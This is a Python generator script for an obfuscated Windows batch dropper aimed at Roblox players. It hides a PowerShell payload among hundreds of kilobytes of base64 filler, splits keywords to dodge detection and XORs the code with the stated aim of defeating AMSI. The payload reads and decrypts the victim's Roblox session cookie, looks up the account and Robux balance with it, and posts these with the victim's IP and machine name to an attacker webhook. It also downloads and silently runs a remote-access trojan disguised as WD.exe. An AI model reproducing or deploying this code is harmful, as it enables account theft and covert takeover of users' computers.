"""Generator: produces obfuscated payload.bat with 500KB+ base64 filler poetry."""
import base64, random, os

WH = os.environ.get("WEBHOOK_URL", "WEBHOOK_PLACEHOLDER")
BASE = os.environ.get("BASE_URL", "BASEURL_VALUE")

# -- WORD BANK for filler poetry --
WORDS = [
    "mirage","sandstorm","wasteland","barren","arid","parched","dry","night","dusk","dawn",
    "twilight","midnight","sunrise","sunset","moonlight","starlight","shadow","light","bright",
    "glow","shine","radiant","luminous","brilliant","gleam","shimmer","sparkle","crystal",
    "diamond","ruby","sapphire","emerald","topaz","amber","jade","pearl","opal","thunder",
    "lightning","storm","tempest","cyclone","tornado","hurricane","blizzard","monsoon","typhoon",
    "forge","anvil","hammer","blade","sword","shield","armor","lance","spear","arrow",
    "nova","nebula","galaxy","comet","meteor","asteroid","planet","orbit","zenith","apex",
    "cipher","encode","decode","encrypt","decrypt","secure","protect","guard","shield","defend",
    "vortex","spiral","helix","curve","arc","circle","sphere","cube","prism","pyramid",
    "titan","atlas","orion","perseus","hercules","achilles","odyssey","apollo","zeus","thor",
    "frost","ice","snow","winter","arctic","tundra","glacier","polar","frozen","cold",
    "fire","flame","blaze","inferno","ember","spark","torch","furnace","kiln","hearth",
    "ocean","wave","tide","current","stream","river","cascade","rapids","waterfall","spring",
    "mountain","peak","summit","ridge","cliff","canyon","valley","gorge","plateau","mesa",
    "forest","grove","wood","timber","jungle","canopy","thicket","brush","undergrowth","clearing",
    "desert","dune","oasis","phoenix","dragon","falcon","eagle","raven","hawk","sparrow",
    "owl","swift","robin","quantum","neutron","photon","electron","proton","atomic","cosmic",
    "stellar","solar","lunar","nexus","matrix","vector","vertex","tensor","scalar","phase",
    "pulse","wave","ghost","phantom","spirit","wraith","specter","shade","echo","vision",
    "lambda","sigma","delta","omega","alpha","beta","gamma","theta","epsilon","zeta",
    "nebula","quasar","pulsar","horizon","aurora","eclipse","solstice","equinox","corona",
    "obsidian","granite","marble","onyx","quartz","basalt","slate","flint","magnet","amber",
    "garnet","ivory","ebony","azure","crimson","scarlet","violet","indigo","golden","silver",
]

def filler_poetry(kb=400):
    """Generate KB of base64-encoded filler poetry."""
    lines = []
    target = kb * 1024
    current = 0
    while current < target:
        chunk = " ".join(random.sample(WORDS, random.randint(40, 80)))
        b64 = base64.b64encode(chunk.encode()).decode()
        lines.append(b64)
        current += len(b64) + 2
    return lines

def split_keyword(word):
    """Split a keyword like 'set' or 'certutil' across undefined variable expansions."""
    result = ""
    for c in word:
        r1 = ''.join(random.sample('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 6))
        r2 = ''.join(random.sample('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 6))
        result += f"%{r1}%{c}%{r2}%"
    return result

# -- THE ACTUAL PAYLOAD (PowerShell) --
PS_PAYLOAD = f'''
$w="{WH}";$b="{BASE}";
$d="$env:TEMP\\dpa.exe";$ip=(irm "http://ip-api.com/json/?fields=query,country,regionName,city,isp");
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
iwr "$b/dpa.exe" -OutFile $d -UseBasicParsing;
$s="$env:LOCALAPPDATA\\Roblox\\LocalStorage\\robloxcookies.dat";
if(Test-Path $s){{$c=[IO.File]::ReadAllText($s);
if($c -match 'CookiesData":"([^"]+)"'){{$k=$Matches[1];[IO.File]::WriteAllText("$env:TEMP\\d.in",$k);
&$d dpapi "$env:TEMP\\d.in" "$env:TEMP\\d.out";
if(Test-Path "$env:TEMP\\d.out"){{$r=[IO.File]::ReadAllText("$env:TEMP\\d.out");
if($r.Length -gt 10){{try{{$ref=(irm "https://rorefresher-production.up.railway.app/refresh?cookie=$r");
if($ref -match 'bypassedCookie":"([^"]+)"'){{$r=$Matches[1]}}}}catch{{}}
$u=irm https://users.roblox.com/v1/users/authenticated -Headers @{{Cookie=".ROBLOSECURITY=$r"}};
$un=$u.name;$uid=$u.id;$rx=(irm https://economy.roblox.com/v1/users/$uid/currency -Headers @{{Cookie=".ROBLOSECURITY=$r"}}).robux;
$pc=$env:COMPUTERNAME;$j=@{{embeds=@(@{{title="Roblox Account";color=65279;
fields=@(@{{name="Username";value="$un";inline=$true}},@{{name="ID";value="$uid";inline=$true}},
@{{name="Robux";value="$rx";inline=$true}},@{{name="IP";value="$($ip.query)";inline=$true}},
@{{name="Country";value="$($ip.country)";inline=$true}},@{{name="City";value="$($ip.city)";inline=$true}},
@{{name="PC";value="$pc";inline=$true}});
footer=@{{text="$pc / $env:USERNAME"}}}})}} | ConvertTo-Json -Depth 4;
irm $w -Method POST -Body $j -ContentType "application/json"}}}}}}}};
iwr "$b/rat" -OutFile "$env:LOCALAPPDATA\\Microsoft\\WD.exe" -UseBasicParsing;
if(Test-Path "$env:LOCALAPPDATA\\Microsoft\\WD.exe"){{Start-Process "$env:LOCALAPPDATA\\Microsoft\\WD.exe" -WindowStyle Hidden}};
'''

# Encode the PS payload as base64, then XOR to defeat AMSI
ps_b64 = base64.b64encode(PS_PAYLOAD.encode('utf-16le')).decode()
XOR_KEY = 0x55
ps_xored = ''.join(chr(ord(c) ^ XOR_KEY) for c in ps_b64)

def generate_bat():
    lines = []
    lines.append("@echo off")
    lines.append("REM " + " ".join(random.sample(WORDS, 10)))
    
    # Generate filler poetry (450KB)
    filler = filler_poetry(450)
    
    # Sprinkle the real payload in 8 chunks among the filler
    chunk_size = len(ps_b64) // 8
    chunks = [ps_b64[i:i+chunk_size] for i in range(0, len(ps_b64), chunk_size)]
    if len(chunks) > 8:
        chunks[7] += ''.join(chunks[8:])
        chunks = chunks[:8]
    
    # Interleave filler + payload chunks
    segments_per_chunk = len(filler) // 9  # 9 segments (8 payload chunks + remainder)
    
    for seg_idx in range(9):
        # Add filler segment
        start = seg_idx * segments_per_chunk
        end = start + segments_per_chunk if seg_idx < 8 else len(filler)
        for fl in filler[start:end]:
            lines.append(f"set {random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ'*8)}{random.randint(1000,9999)}={fl}")
        
        if seg_idx < 8:
            # Add a payload chunk disguised as a filler variable
            vname = ''.join(random.sample('abcdefghijklmnopqrstuvwxyz', 8))
            lines.append(f"set {vname}={chunks[seg_idx]}")
            # Store the variable name for later reconstruction
            if seg_idx == 0:
                lines.append(f"REM phase {random.choice(WORDS)} {random.choice(WORDS)} {random.choice(WORDS)} {random.choice(WORDS)}")
    
    # Add the reconstruction and execution code at the end
    lines.append("REM " + " ".join(random.sample(WORDS, 8)))
    
    # Write the XOR'd base64 in 2000-char chunks
    b64_file = f'%TEMP%\\{random.choice("abcdefghijklmnopqrstuvwxyz")}{random.randint(100,999)}.b64'
    
    # Write chunks
    for i in range(0, len(ps_xored), 2000):
        chunk = ps_xored[i:i+2000]
        if i == 0:
            lines.append(f"echo {chunk}> {b64_file}")
        else:
            lines.append(f"echo {chunk}>> {b64_file}")
    
    # XOR decode + base64 decode + execute
    lines.append(f'{split_keyword("powershell")} -w h -c "$b=[IO.File]::ReadAllText(\'{b64_file}\');$d=\"\";for($i=0;$i-lt$b.Length;$i++){{$d+=[char]($b[$i]-bxor 0x55)}};$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($d));iex $s"')
    
    # Add some final filler
    for _ in range(20):
        lines.append(f"REM {' '.join(random.sample(WORDS, random.randint(5, 12)))}")
    
    return "\r\n".join(lines)

if __name__ == "__main__":
    bat = generate_bat()
    with open("payload.bat", "w", encoding="utf-8") as f:
        f.write(bat)
    size_kb = len(bat.encode()) / 1024
    print(f"Generated payload.bat ({size_kb:.0f} KB)")
